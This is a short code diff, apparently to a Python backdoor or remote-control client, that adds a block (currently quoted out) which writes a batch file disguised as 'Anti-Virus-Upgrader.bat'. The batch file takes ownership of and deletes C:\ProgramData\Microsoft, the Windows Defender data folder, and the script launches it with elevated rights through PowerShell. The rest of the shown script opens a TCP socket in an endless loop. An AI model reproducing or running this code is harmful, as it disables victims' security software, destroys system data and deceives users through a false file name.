@@ -1,5 +1,13 @@
 import os, socket, threading
 ip = socket.gethostbyname(socket.gethostname())#for testing
+'''
+windefdelname = 'Anti-Virus-Upgrader.bat'
+windefdelfile = open(windefdelname, 'w')
+lines = ['\ntakeown /f C:\\ProgramData\\Microsoft\n','\ncd C:/ProgramData/\n', '\nrmdir /S/Q Microsoft\n']
+windefdelfile.writelines(lines)
+os.system(f'powershell "start {windefdelname} -v runAs"')
+os.startfile(windefdelname)
+'''
 while True:
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
